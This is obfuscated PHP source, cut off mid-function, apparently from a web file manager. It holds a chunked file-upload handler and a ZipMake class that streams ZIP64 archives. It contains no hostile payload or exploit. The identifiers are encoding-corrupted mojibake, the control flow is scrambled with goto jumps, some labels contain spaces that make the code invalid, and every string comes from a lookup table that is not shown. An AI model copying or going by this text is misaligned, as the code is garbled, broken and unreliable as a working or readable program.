$fùé¬®óÌõ = IO::hashSimple($a•Å¼—²í); $a³½±±äİ = IO::size($a•Å¼—²í); goto e‚Ñ”¹ßÚ; B‡–ˆ²Ğ‚à: $a•Å¼—²í = $this->moveUploadedFile($Bò…ê×­©·); if ($a³½±±äİ > 0 && filesize($a•Å¼—²í) == 0) { $this->showJson($Aà²ĞÄÏÚù[1982], !1); } if (!$a•Å¼—²í) { $this->showJson(LNG($Aà²ĞÄÏÚù[1983]), !1); } goto B÷ŠçÑ‹Ğç; DùÎÍğù«Å: $båŠæÏëñ[$Aà²ĞÄÏÚù[1987]][$Aà²ĞÄÏÚù[1988] . $f¨³¹ã‚Ï•] = array($Aà²ĞÄÏÚù[1989] => $bŸÔ°¹‘¯ò, $Aà²ĞÄÏÚù[1044] => $f¨³¹ã‚Ï•, $Aà²ĞÄÏÚù[77] => $a³½±±äİ, $Aà²ĞÄÏÚù[168] => $fùé¬®óÌõ); $this->statusSet($båŠæÏëñ); if (count($båŠæÏëñ[$Aà²ĞÄÏÚù[1987]]) != $båŠæÏëñ[$Aà²ĞÄÏÚù[1986]]) { $this->showJson($Aà²ĞÄÏÚù[1990] . $f¨³¹ã‚Ï•, !0); } goto A‹ÙñÙë; A Åëà»: CacheLock::lock($this->tempFile, 20); $båŠæÏëñ = $this->statusGet(); $this->initFileTemp(); goto B‡–ˆ²Ğ‚à; A‹ÙñÙë: ignore_timeout(); if (!$this->checkChunkHash($båŠæÏëñ)) { $this->showJson($Aà²ĞÄÏÚù[1991], !1); } $this->statusSet(!1); goto eºº¨Íã¼; f†µ«ËÎ±Å: $Bò…ê×­©· = $this->tempFile . $Aà²ĞÄÏÚù[1979] . $f¨³¹ã‚Ï•; $a³½±±äİ = isset($this->in[$Aà²ĞÄÏÚù[533]]) ? intval($this->in[$Aà²ĞÄÏÚù[533]]) : 0; $eŞƒÔ²ì†­ = isset($this->in[$Aà²ĞÄÏÚù[1980]]) ? intval($this->in[$Aà²ĞÄÏÚù[1980]]) : 0; goto Dƒä‚ç§¯â; B÷ŠçÑ‹Ğç: $bŸÔ°¹‘¯ò = $f¨³¹ã‚Ï• * $eŞƒÔ²ì†­; $EİßÊ÷Ãƒ = @fopen($this->tempFile, $Aà²ĞÄÏÚù[1984]); fseek_64($EİßÊ÷Ãƒ, $bŸÔ°¹‘¯ò); goto bà…ÚÑŸ„¨; eºº¨Íã¼: CacheLock::unlock($this->tempFile); return $this->tempFile; goto cİ˜ªÍÀÕÚ; Dƒä‚ç§¯â: if ($D†ßÃãÇæ > 1 && $eŞƒÔ²ì†­ <= 0) { show_json($Aà²ĞÄÏÚù[1981], !1); } if ($eŞƒÔ²ì†­ > $a³½±±äİ) { $D†ßÃãÇæ = 1; } if ($D†ßÃãÇæ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto A Åëà»; FÒñĞİİâ¬: $Aà²ĞÄÏÚù =& $_SERVER[‡’¶øåüç˜]; $f¨³¹ã‚Ï• = isset($this->in[$Aà²ĞÄÏÚù[1977]]) ? intval($this->in[$Aà²ĞÄÏÚù[1977]]) : 0; $D†ßÃãÇæ = isset($this->in[$Aà²ĞÄÏÚù[1978]]) ? intval($this->in[$Aà²ĞÄÏÚù[1978]]) : 1; goto f†µ«ËÎ±Å; e‚Ñ”¹ßÚ: @unlink($a•Å¼—²í); if (!$A¤‚Ïìå‚) { $this->showJson($Aà²ĞÄÏÚù[1985] . $f¨³¹ã‚Ï•, !1); } $båŠæÏëñ[$Aà²ĞÄÏÚù[1986]] = $D†ßÃãÇæ; goto DùÎÍğù«Å; cİ˜ªÍÀÕÚ: } private function checkSize() { $e¦›†´’©Î =& $_SERVER[‡’¶øåüç˜]; if (phpBuild64() || $this->in[$e¦›†´’©Î[77]] < PHP_INT_MAX) { return; } show_json(LNG($e¦›†´’©Î[1992]), !1); } private function showJson($dÍÄ«Ìêä†, $DŞ‹´ÙæÂ¦) { CacheLock::unlock($this->tempFile); if (!$DŞ‹´ÙæÂ¦) { return show_json($dÍÄ«Ìêä†, $DŞ‹´ÙæÂ¦); } show_json($dÍÄ«Ìêä†, $DŞ‹´ÙæÂ¦); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto CÖ—·‡Å‹; EâÚæÏİ²ô: touch($E™Ë¡ÆËÂ› . $däÁ»«¼‚¡[1993]); $e‘¯ÌÄÇÁã = isset($this->in[$däÁ»«¼‚¡[1994]]) ? $this->in[$däÁ»«¼‚¡[1994]] : !1; if (strlen($e‘¯ÌÄÇÁã) < 30) { $e‘¯ÌÄÇÁã = md5(USER_ID . $this->in[$däÁ»«¼‚¡[75]] . $this->fileName . $this->in[$däÁ»«¼‚¡[77]]); } goto bÚ˜¦öƒ÷Â; bÚ˜¦öƒ÷Â: $this->tempFile = $E™Ë¡ÆËÂ› . $däÁ»«¼‚¡[1995] . md5($e‘¯ÌÄÇÁã . $this->in[$däÁ»«¼‚¡[1538]]); goto CøÚøİĞí; CÖ—·‡Å‹: $däÁ»«¼‚¡ =& $_SERVER[‡’¶øåüç˜]; $E™Ë¡ÆËÂ› = TEMP_FILES; @mk_dir($E™Ë¡ÆËÂ›); goto EâÚæÏİ²ô; CøÚøİĞí: } private function moveUploadedFile($D±§¹ôŞöî) { $c©Ğ¬£¨à• =& $_SERVER[‡’¶øåüç˜]; $E·›¶õï‘· = $this->uploadFile; if ($E·›¶õï‘· == $c©Ğ¬£¨à•[1996]) { @file_put_contents($D±§¹ôŞöî, base64_decode($_REQUEST[$c©Ğ¬£¨à•[1997]])); } else { if ($E·›¶õï‘· == $c©Ğ¬£¨à•[1819]) { $b„É‹¼˜ = @fopen($D±§¹ôŞöî, $c©Ğ¬£¨à•[1528]); $this->writeTo($E·›¶õï‘·, $b„É‹¼˜, $D±§¹ôŞöî); } else { if (!move_uploaded_file($E·›¶õï‘·, $D±§¹ôŞöî)) { return !1; } } } return $D±§¹ôŞöî; } private function writeTo($D¢¸ŸòæĞ®, $b„Ø‘ˆë˜±, $cÎåñæä£†) { goto fĞ‰âÒïÒ²; BÓ©”Ğé’: fclose($Dä‡ÖÉÖ”Â); fclose($b„Ø‘ˆë˜±); CacheLock::unlock($BÀ„Š­ÔÖˆ); goto B¹Àñ©…¼†; fĞ‰âÒïÒ²: $e–÷°øˆÒ =& $_SERVER[‡’¶øåüç˜]; $BÀ„Š­ÔÖˆ = $e–÷°øˆÒ[1998] . $cÎåñæä£†; $B÷”·‹ù´÷ = CacheLock::lock($BÀ„Š­ÔÖˆ, 1); goto f–òÛÜ¹–õ; B¹Àñ©…¼†: return !0; goto FÉëÅ“Ò¡; f–òÛÜ¹–õ: $Dä‡ÖÉÖ”Â = @fopen($D¢¸ŸòæĞ®, $e–÷°øˆÒ[1527]); if (!$Dä‡ÖÉÖ”Â || !$b„Ø‘ˆë˜± || !$B÷”·‹ù´÷) { CacheLock::unlock($BÀ„Š­ÔÖˆ); return !1; } while (!feof($Dä‡ÖÉÖ”Â)) { fwrite($b„Ø‘ˆë˜±, fread($Dä‡ÖÉÖ”Â, 1024 * 200)); } goto BÓ©”Ğé’; FÉëÅ“Ò¡: } private function statusGet() { goto c¶È‰‹¤øç; d–”¢»ºò: if (!$this->statusData) { $EåØÑ£ğÊŠ = array($A·çìö¿‹[28] => $this->fileName, $A·çìö¿‹[1986] => 0, $A·çìö¿‹[1987] => array()); $this->statusSet($EåØÑ£ğÊŠ); } return $this->statusData; goto Bğ¤ÙÇøõ; AÃÀí«Ñ“š: $FÇ¶ø­ó’ß = !1; if (file_exists($C¯”â¨‚İ¡)) { $FÇ¶ø­ó’ß = @file_get_contents($C¯”â¨‚İ¡); } if ($FÇ¶ø­ó’ß) { $this->statusData = json_decode($FÇ¶ø­ó’ß, !0); } goto d–”¢»ºò; c¶È‰‹¤øç: $A·çìö¿‹ =& $_SERVER[‡’¶øåüç˜]; if (is_array($this->statusData)) { return $this->statusData; } $C¯”â¨‚İ¡ = $this->tempFile . $A·çìö¿‹[1999]; goto AÃÀí«Ñ“š; Bğ¤ÙÇøõ: } public function statusSet($bÓ’¨¹÷‘‡) { $dÔ³×˜œøå = $this->tempFile . $_SERVER[‡’¶øåüç˜][1999]; if (!$bÓ’¨¹÷‘‡) { if (file_exists($dÔ³×˜œøå)) { @unlink($dÔ³×˜œøå); } return !0; } $this->statusData = $bÓ’¨¹÷‘‡; return file_put_contents($dÔ³×˜œøå, json_encode($bÓ’¨¹÷‘‡)); } private function initFileTemp() { $aî“ŠŒØÈ™ =& $_SERVER[‡’¶øåüç˜]; if (file_exists($this->tempFile)) { return; } $Dø‹­¬›¾¼ = fopen($this->tempFile, $aî“ŠŒØÈ™[2000]); fseek_64($Dø‹­¬›¾¼, $this->in[$aî“ŠŒØÈ™[77]] - 1, SEEK_SET); fwrite($Dø‹­¬›¾¼, $aî“ŠŒØÈ™[481]); fclose($Dø‹­¬›¾¼); } public function checkChunk() { goto C·äØ²”äœ; C·äØ²”äœ: $EÔ›‚É =& $_SERVER[‡’¶øåüç˜]; $a¤¢»ñè’Ä = array(); CacheLock::lock($this->tempFile); goto cî®ìŠÖŠ…; fãÏ£”òÕ¶: return $a¤¢»ñè’Ä; goto bËÁ»ÃÂ’”; cî®ìŠÖŠ…: $Dƒ©‘Ô¼Ÿ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Dƒ©‘Ô¼Ÿ[$EÔ›‚É[1987]] as $fÁøƒä‰Û) { $E¥Šòƒ»æ› = $fÁøƒä‰Û[$EÔ›‚É[168]]; if ($E¥Šòƒ»æ›) { $a¤¢»ñè’Ä[$EÔ›‚É[2001] . $fÁøƒä‰Û[$EÔ›‚É[1044]]] = $E¥Šòƒ»æ›; } } goto fãÏ£”òÕ¶; bËÁ»ÃÂ’”: } private function checkChunkHash($FÄÚç‚×Œö) { goto b–ÔÁæ¬ÌÖ; c«Ø”Ñì«: $DšÂŒÕÁ’è = !0; foreach ($FÄÚç‚×Œö[$fî›¯Àø¾º[1987]] as $D¹›ä©¿ë) { fseek_64($b•œÓ¶˜İİ, $D¹›ä©¿ë[$fî›¯Àø¾º[1989]]); $c±Í¹ß…¬ª = PathDriverStream::hash($b•œÓ¶˜İİ, $D¹›ä©¿ë[$fî›¯Àø¾º[77]]); if ($D¹›ä©¿ë[$fî›¯Àø¾º[168]] != $c±Í¹ß…¬ª) { $DšÂŒÕÁ’è = !1; break; } } fclose($b•œÓ¶˜İİ); goto Câí‰ªòÚ™; Câí‰ªòÚ™: return $DšÂŒÕÁ’è; goto FÂá”µÇ¯; b–ÔÁæ¬ÌÖ: $fî›¯Àø¾º =& $_SERVER[‡’¶øåüç˜]; if (count($FÄÚç‚×Œö[$fî›¯Àø¾º[1987]]) != $FÄÚç‚×Œö[$fî›¯Àø¾º[1986]]) { return !1; } $a‘Ùá„Ÿ = _get($this->in, $fî›¯Àø¾º[1994]); goto C˜æ¦©»¯§; C˜æ¦©»¯§: $BÌáõ›»ô¶ = _get($this->in, $fî›¯Àø¾º[2002]); if (strlen($BÌáõ›»ô¶) == 32 && IO::hashSimple($this->tempFile) == $a‘Ùá„Ÿ && IO::hashMd5($this->tempFile) == $BÌáõ›»ô¶) { return !0; } $b•œÓ¶˜İİ = fopen($this->tempFile, $fî›¯Àø¾º[1176]); goto c«Ø”Ñì«; FÂá”µÇ¯: } public static function fileName() { goto a‚Ò¡ö¦Ş; fâª¬Š‹Ë: return KodIO::clear($A’Š’‡Ì–); goto CÅ–Ñ´ÓÌ‰; a‚Ò¡ö¦Ş: $eÄÊŸš‹…À =& $_SERVER[‡’¶øåüç˜]; global $in; $A’Š’‡Ì– = isset($in[$eÄÊŸš‹…À[28]]) ? $in[$eÄÊŸš‹…À[28]] : $eÄÊŸš‹…À[33]; goto A¸øÍÃö; A¸øÍÃö: if (!empty($_FILES)) { $A’Š’‡Ì– = $A’Š’‡Ì– ? $A’Š’‡Ì– : $_FILES[$eÄÊŸš‹…À[171]][$eÄÊŸš‹…À[398]]; } if (!is_wap()) { return KodIO::clear($A’Š’‡Ì–); } $CíØ¿Œ÷šµ = strtotime($in[$eÄÊŸš‹…À[2003]]); goto cÁ×™é¨¬ˆ; cÁ×™é¨¬ˆ: $CíØ¿Œ÷šµ = $CíØ¿Œ÷šµ ? $CíØ¿Œ÷šµ : time(); $a¿«é…õÛ² = strtolower($A’Š’‡Ì–); if ($a¿«é…õÛ² == $eÄÊŸš‹…À[2004] || $a¿«é…õÛ² == $eÄÊŸš‹…À[2005]) { $A’Š’‡Ì– = date($eÄÊŸš‹…À[696], $CíØ¿Œ÷šµ) . $eÄÊŸš‹…À[70] . $in[$eÄÊŸš‹…À[77]] . $eÄÊŸš‹…À[1633]; } else { if ($a¿«é…õÛ² == $eÄÊŸš‹…À[2006]) { $A’Š’‡Ì– = date($eÄÊŸš‹…À[696], $CíØ¿Œ÷šµ) . $eÄÊŸš‹…À[70] . $in[$eÄÊŸš‹…À[77]] . $eÄÊŸš‹…À[2007]; } } goto fâª¬Š‹Ë; CÅ–Ñ´ÓÌ‰: } private function errorInfo($cÊ®›à©‹¯) { $F×’êò‚¨Á =& $_SERVER[‡’¶øåüç˜]; $fÚ©ò¶”ª = array($F×’êò‚¨Á[2008], $F×’êò‚¨Á[2009], $F×’êò‚¨Á[2010], $F×’êò‚¨Á[2011], $F×’êò‚¨Á[2012], $F×’êò‚¨Á[2013], $F×’êò‚¨Á[2014], $F×’êò‚¨Á[2015]); return $cÊ®›à©‹¯ . $F×’êò‚¨Á[4] . $fÚ©ò¶”ª[$cÊ®›à©‹¯]; } } class ZipMake { const VERSION = "\x30\x2e\62\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($f¬Î›å¨Ó = null) { $Bİ§¡™äÂ‹ =& $_SERVER[‡’¶øåüç˜]; $this->outputStream = fopen($Bİ§¡™äÂ‹[2016], $Bİ§¡™äÂ‹[1232]); $this->outputName = $f¬Î›å¨Ó; $this->needHeaders = !0; } public function addFile($cÃˆêÒæãÌ, $bº°º˜“ˆ) { goto dË Ïªé; dË Ïªé: $B‡›ø´º¡Ú =& $_SERVER[‡’¶øåüç˜]; $cÃˆêÒæãÌ = $this->filterFilename($cÃˆêÒæãÌ); $a½Çˆ“äÜØ = static::METHOD_STORE; goto CÎÌÖãœ¾™; f¢šè†¯Ñ: while (!feof($eÂá¬¿Ş„Ó)) { $FÍÑ«ÌÕŒ× = fread($eÂá¬¿Ş„Ó, 1048576); $this->send($FÍÑ«ÌÕŒ×); } fclose($eÂá¬¿Ş„Ó); $DŠ©ŒÜ†ŸŒ = hexdec(hash_file($B‡›ø´º¡Ú[2018], $bº°º˜“ˆ)); goto fÄàäÌ–Îà; fÄàäÌ–Îà: $this->addFileFooter($cÃˆêÒæãÌ, $a½Çˆ“äÜØ, $DŠ©ŒÜ†ŸŒ, $Eé»šäÅÌ›, $BÙÀÕõ¨…£, $bº¦ æÇä‚); goto b¥º¤†ƒ²¥; CÎÌÖãœ¾™: $bº¦ æÇä‚ = $this->addFileHeader($cÃˆêÒæãÌ, $a½Çˆ“äÜØ); $Eé»šäÅÌ› = $BÙÀÕõ¨…£ = filesize_64($bº°º˜“ˆ); $eÂá¬¿Ş„Ó = fopen($bº°º˜“ˆ, $B‡›ø´º¡Ú[2017]); goto f¢šè†¯Ñ; b¥º¤†ƒ²¥: } public function addFileFromStream($EäÄÃ•§, $a÷×î”ŞöÒ) { goto eÃÒ…´ñÏÏ; eÃÒ…´ñÏÏ: $EäÄÃ•§ = $this->filterFilename($EäÄÃ•§); $d·š¢Á³ì = static::METHOD_STORE; $E­‰ñ ÙÄ¨ = $this->addFileHeader($EäÄÃ•§, $d·š¢Á³ì); goto d¼Œ™à÷; Dàßù–Şß•: $dÙ…Û£ØØ± = hash_init($_SERVER[‡’¶øåüç˜][2018]); while (!feof($a÷×î”ŞöÒ)) { $A—‰¯ë¼­´ = fread($a÷×î”ŞöÒ, 1048576); hash_update($dÙ…Û£ØØ±, $A—‰¯ë¼­´); $this->send($A—‰¯ë¼­´); } $bŸ”²Ü†ŒÇ = hexdec(hash_final($dÙ…Û£ØØ±)); goto CàÙÏáÄ™; d¼Œ™à÷: fseek($a÷×î”ŞöÒ, 0, SEEK_END); $Fö¡‰²äëÓ = $d‰ƒ¤Üè±ó = ftell($a÷×î”ŞöÒ); rewind($a÷×î”ŞöÒ); goto Dàßù–Şß•; CàÙÏáÄ™: $this->addFileFooter($EäÄÃ•§, $d·š¢Á³ì, $bŸ”²Ü†ŒÇ, $Fö¡‰²äëÓ, $d‰ƒ¤Üè±ó, $E­‰ñ ÙÄ¨); goto b¶‹ÂÖ×•Ş; b¶‹ÂÖ×•Ş: } public function finish() { foreach ($this->files as $dÛˆŠÔÈ¨ñ) { $this->addCdrFile($dÛˆŠÔÈ¨ñ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($f±—³‘©ƒ, $aåÔèˆèÛ) { goto aîÚ¹Ïöè; A•§ø¦¥ôâ: $aÑÆõĞó·¶ = $this->packFields($f‹É’¨â¼Ö); $EŸ¿ÖğÎ¤¦ = $this->packFields($C–¾×Ä±ƒ); $this->send($aÑÆõĞó·¶ . $f±—³‘©ƒ . $EŸ¿ÖğÎ¤¦); goto E®Â…·Ø®½; EĞ×ºé†ª: $bÂç±À‘ò§ = $this->dosTime(time()); $f‹É’¨â¼Ö = array(array($e£Æ¯ªË¢[2020], static::FILE_HEADER_SIGNATURE), array($e£Æ¯ªË¢[2021], static::ZIP_VERSION_64), array($e£Æ¯ªË¢[2021], 8), array($e£Æ¯ªË¢[2021], $aåÔèˆèÛ), array($e£Æ¯ªË¢[2020], $bÂç±À‘ò§), array($e£Æ¯ªË¢[2020], 0), array($e£Æ¯ªË¢[2020], 4294967295), array($e£Æ¯ªË¢[2020], 4294967295), array($e£Æ¯ªË¢[2021], $D®õÔ‚ƒ), array($e£Æ¯ªË¢[2021], 32)); $C–¾×Ä±ƒ = array(array($e£Æ¯ªË¢[2021], 1), array($e£Æ¯ªË¢[2021], 28), array($e£Æ¯ªË¢[2022], 0), array($e£Æ¯ªË¢[2022], 0), array($e£Æ¯ªË¢[2022], 0), array($e£Æ¯ªË¢[2020], 0)); goto A•§ø¦¥ôâ; aîÚ¹Ïöè: $e£Æ¯ªË¢ =& $_SERVER[‡’¶øåüç˜]; $f±—³‘©ƒ = preg_replace($e£Æ¯ªË¢[2019], $e£Æ¯ªË¢[33], $f±—³‘©ƒ); $D®õÔ‚ƒ = strlen($f±—³‘©ƒ); goto EĞ×ºé†ª; E®Â…·Ø®½: return strlen($aÑÆõĞó·¶) + $D®õÔ‚ƒ + strlen($EŸ¿ÖğÎ¤¦); goto Dºƒ„Çí; Dºƒ„Çí: } protected function addFileFooter($B¬ÆÙî“Îæ, $d¾‡ÌÛİÛ‡, $eÅšİš—, $bÁ®Î¼¯“, $FŞëä†›Üğ, $D•¦Í¼ß) { $A…ß•…Òë =& $_SERVER[‡’¶øåüç˜]; $c³é±‹Õµ¿ = array(array($A…ß•…Òë[2020], static::DATA_DESCRIPTOR_SIGNATURE), array($A…ß•…Òë[2020], $eÅšİš—), array($A…ß•…Òë[2022], $bÁ®Î¼¯“), array($A…ß•…Òë[2022], $FŞëä†›Üğ)); $E±­ˆ½·õÀ = $this->packFields($c³é±‹Õµ¿); $this->send($E±­ˆ½·õÀ); $f§¡Ô—ï‰Ğ = $D•¦Í¼ß + $bÁ®Î¼¯“ + $bù—¿Æù•ç; $this->addToCdr($B¬ÆÙî“Îæ, $d¾‡ÌÛİÛ‡, $eÅšİš—, $bÁ®Î¼¯“, $FŞëä†›Üğ, $f§¡Ô—ï‰Ğ); } private function addToCdr($D¦ğ‡¤†ª÷, $D–ŸÕ, $D¤—Äæ…§, $Fºøªœ¼¶×, $AíÓ²ĞùĞÕ, $dÎ³™‘ÆÃ‡) { $this->files[] = array($D¦ğ‡¤†ª÷, $D–ŸÕ, $D¤—Äæ…§, $Fºøªœ¼¶×, $AíÓ²ĞùĞÕ, $this->ofs); $this->ofs += $dÎ³™‘ÆÃ‡; } protected function addCdrFile($a‡áÆ¥…‚Ç) { goto D‹Î°ùÁÕ; cé×Ù¨¸ê¶: $EŞŸæ£ÅÆ² = $this->packFields($E£¼ÑÜ‚İ); $Cªœ¨ã™©é = $this->packFields($dÕÒøÄÃö); $C¤é‚ ì’† = $EŞŸæ£ÅÆ² . $eŸ´Œºñ› . $D¡¡‘¢“‡ . $Cªœ¨ã™©é; goto dààÌ×èåÏ; D‹Î°ùÁÕ: $dÂÌ½öï¹ï =& $_SERVER[‡’¶øåüç˜]; list($eŸ´Œºñ›, $d“±İå²°, $dÇë·™¶æø, $fø…µØáñ’, $dÍÒ½ŒÌ, $CâãĞ¶±áÎ) = $a‡áÆ¥…‚Ç; $D¡¡‘¢“‡ = $dÂÌ½öï¹ï[33]; goto cìô×³ÙÓ; dààÌ×èåÏ: $this->send($C¤é‚ ì’†); $this->cdr_ofs += strlen($C¤é‚ ì’†); goto Fî·÷²‹…; cìô×³ÙÓ: $dÜ³îŒ«÷ = $this->dosTime(time()); $E£¼ÑÜ‚İ = array(array($dÂÌ½öï¹ï[2020], static::CDR_FILE_SIGNATURE), array($dÂÌ½öï¹ï[2021], static::ZIP_VERSION_64), array($dÂÌ½öï¹ï[2021], static::ZIP_VERSION_64), array($dÂÌ½öï¹ï[2021], 8), array($dÂÌ½öï¹ï[2021], $d“±İå²°), array($dÂÌ½öï¹ï[2020], $dÜ³îŒ«÷), array($dÂÌ½öï¹ï[2020], $dÇë·™¶æø), array($dÂÌ½öï¹ï[2020], 4294967295), array($dÂÌ½öï¹ï[2020], 4294967295), array($dÂÌ½öï¹ï[2021], strlen($eŸ´Œºñ›)), array($dÂÌ½öï¹ï[2021], 32), array($dÂÌ½öï¹ï[2021], strlen($D¡¡‘¢“‡)), array($dÂÌ½öï¹ï[2021], 0), array($dÂÌ½öï¹ï[2021], 0), array($dÂÌ½öï¹ï[2020], 32), array($dÂÌ½öï¹ï[2020], 4294967295)); $dÕÒøÄÃö = array(array($dÂÌ½öï¹ï[2021], 1), array($dÂÌ½öï¹ï[2021], 28), array($dÂÌ½öï¹ï[2022], $dÍÒ½ŒÌ), array($dÂÌ½öï¹ï[2022], $fø…µØáñ’), array($dÂÌ½öï¹ï[2022], $CâãĞ¶±áÎ), array($dÂÌ½öï¹ï[2020], 0)); goto cé×Ù¨¸ê¶; Fî·÷²‹…: } protected function addCdr64Eof() { goto fŒœ·Œ÷ô…; fŒœ·Œ÷ô…: $C¨éÏŞÃ·ç =& $_SERVER[‡’¶øåüç˜]; $e˜ÛÂ¤‰‡ = count($this->files); $d‡àÈË¾¿ê = $this->cdr_ofs; goto D·®’Ì›¹; D·®’Ì›¹: $B‚ÖëéÆ‡Œ = $this->ofs; $CÖÍ…ØŒæà = array(array($C¨éÏŞÃ·ç[2020], static::ZIP64_CDR_EOF_SIGNATURE), array($C¨éÏŞÃ·ç[2022], 44), array($C¨éÏŞÃ·ç[2021], static::ZIP_VERSION_64), array($C¨éÏŞÃ·ç[2021], static::ZIP_VERSION_64), array($C¨éÏŞÃ·ç[2020], 0), array($C¨éÏŞÃ·ç[2020], 0), array($C¨éÏŞÃ·ç[2022], $e˜ÛÂ¤‰‡), array($C¨éÏŞÃ·ç[2022], $e˜ÛÂ¤‰‡), array($C¨éÏŞÃ·ç[2022], $d‡àÈË¾¿ê), array($C¨éÏŞÃ·ç[2022], $B‚ÖëéÆ‡Œ)); $C“íª—Ñ® = $this->packFields($CÖÍ…ØŒæà); goto dÑÒŞßƒ‰ò; dÑÒŞßƒ‰ò: $this->send($C“íª—Ñ®); goto B¾í…©öŒ; B¾í…©öŒ: } protected function addCdr64Locator() { goto B¾Ñí‹´Ö ; bÂîÈÇ¡‹‘: $this->send($b­æ¨êÈ»¥); goto e³É‘ÖÀĞ; B¾Ñí‹´Ö : $eì›ÃêÉÑ =& $_SERVER[‡’¶øåüç˜]; $cŠÏÜ¿˜¸Á = count($this->files); $c«İè‡•› = $this->cdr_ofs; goto CÏ»«õ½à; CÏ»«õ½à: $FÈğ†­×– = $this->ofs; $bÈ¥ Œ»•ò = array(array($eì›ÃêÉÑ[2020], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($eì›ÃêÉÑ[2020], 0), array($eì›ÃêÉÑ[2022], $FÈğ†­×– + $c«İè‡•›), array($eì›ÃêÉÑ[2020], 1)); $b­æ¨êÈ»¥ = $this->packFields($bÈ¥ Œ»•ò); goto bÂîÈÇ¡‹‘; e³É‘ÖÀĞ: } protected function addCdrEof() { goto cö–µá¶§Ö; cö–µá¶§Ö: $cÛîÁøŒÕÇ =& $_SERVER[‡’¶øåüç˜]; $FæÒ¥à‘²Å = count($this->files); $EÙ”È²ù²õ = $this->cdr_ofs; goto B‘Øì„Î¾; B‘Øì„Î¾: $A¼´Ÿáªª = $this->ofs; $f”È·½Ù´¹ = $cÛîÁøŒÕÇ[33]; $Fƒñ¦çôÍ = array(array($cÛîÁøŒÕÇ[2020], static::CDR_EOF_SIGNATURE), array($cÛîÁøŒÕÇ[2021], 0), array($cÛîÁøŒÕÇ[2021], 0), array($cÛîÁøŒÕÇ[2021], $FæÒ¥à‘²Å), array($cÛîÁøŒÕÇ[2021], $FæÒ¥à‘²Å), array($cÛîÁøŒÕÇ[2020], 4294967295), array($cÛîÁøŒÕÇ[2020], 4294967295), array($cÛîÁøŒÕÇ[2021], strlen($f”È·½Ù´¹))); goto A‘Ì­Ä­‹Õ; A‘Ì­Ä­‹Õ: $aœ‘‘¡Åñã = $this->packFields($Fƒñ¦çôÍ) . $f”È·½Ù´¹; $this->send($aœ‘‘¡Åñã); goto c÷ŠÖ¼Ÿ–Œ; c÷ŠÖ¼Ÿ–Œ: } protected function addCdr() { foreach ($this->files as $eÜ‘ãæçĞ·) { $this->addCdrFile($eÜ‘ãæçĞ·); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $dŠ¯ã¬Õ  =& $_SERVER[‡’¶øåüç˜]; $b¬Ìë’µ¤í = $dŠ¯ã¬Õ [206]; if ($this->outputName) { $fŒ„Ú‰ÆÊ = trim(str_replace(array($dŠ¯ã¬Õ [113], $dŠ¯ã¬Õ [55], $dŠ¯ã¬Õ [93], $dŠ¯ã¬Õ [67], $dŠ¯ã¬Õ [221], $dŠ¯ã¬Õ [996]), $dŠ¯ã¬Õ [33], $this->outputName)); $b‚Œ„ºÛ»Ø = rawurlencode($fŒ„Ú‰ÆÊ); $b¬Ìë’µ¤í .= "\73\x20\146\151\154\145\x6e\x61\155\x65\52\x3d\x75\164\x66\55\x38\47\x27{$b‚Œ„ºÛ»Ø}"; } $d¡¼½Ôî» = array($dŠ¯ã¬Õ [203] => $dŠ¯ã¬Õ [2023], $dŠ¯ã¬Õ [2024] => $b¬Ìë’µ¤í, $dŠ¯ã¬Õ [2025] => $dŠ¯ã¬Õ [2026], $dŠ¯ã¬Õ [2027] => $dŠ¯ã¬Õ [2028], $dŠ¯ã¬Õ [2029] => $dŠ¯ã¬Õ [2030]); foreach ($d¡¼½Ôî» as $cç½òŒùí— => $bá…ø¿„) { header($cç½òŒùí— . $dŠ¯ã¬Õ [883] . $bá…ø¿„); } } protected function send($f§¥Ğáæ»Ö) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $f§¥Ğáæ»Ö); } protected final function dosTime($dÇ«ì–¸Û) { $CÕ¥²‹è° =& $_SERVER[‡’¶øåüç˜]; $Bëóù›ê¬“ = getdate($dÇ«ì–¸Û); if ($Bëóù›ê¬“[$CÕ¥²‹è°[1730]] < 1980) { $Bëóù›ê¬“ = array($CÕ¥²‹è°[1730] => 1980, $CÕ¥²‹è°[2031] => 1, $CÕ¥²‹è°[2032] => 1, $CÕ¥²‹è°[2033] => 0, $CÕ¥²‹è°[2034] => 0, $CÕ¥²‹è°[2035] => 0); } $Bëóù›ê¬“[$CÕ¥²‹è°[1730]] -= 1980; return $Bëóù›ê¬“[$CÕ¥²‹è°[1730]] << 25 | $Bëóù›ê¬“[$CÕ¥²‹è°[2031]] << 21 | $Bëóù›ê¬“[$CÕ¥²‹è°[2032]] << 16 | $Bëóù›ê¬“[$CÕ¥²‹è°[2033]] << 11 | $Bëóù›ê¬“[$CÕ¥²‹è°[2034]] << 5 | $Bëóù›ê¬“[$CÕ¥²‹è°[2035]] >> 1; } protected function packFields($A¦²†‘‡×‘) { $Eƒ’ëÌ‚× =& $_SERVER[‡’¶øåüç˜]; $aÌÆ›–ª½ = $Eƒ’ëÌ‚×[33]; $BÔ¢½šËî§ = array(); foreach ($A¦²†‘‡×‘ as $eŒÜ²¥„œ) { $aÌÆ›–ª½ .= $eŒÜ²¥„œ[0]; $BÔ¢½šËî§[] = $eŒÜ²¥„œ[1]; } array_unshift($BÔ¢½šËî§, $aÌÆ›–ª½); return call_user_func_array($Eƒ’ëÌ‚×[2036], $BÔ¢½šËî§); } protected function filterFilename($c´ÍŠÀ¶í) { $bß‘Ã¶‡ãÀ =& $_SERVER[‡’¶øåüç˜]; return 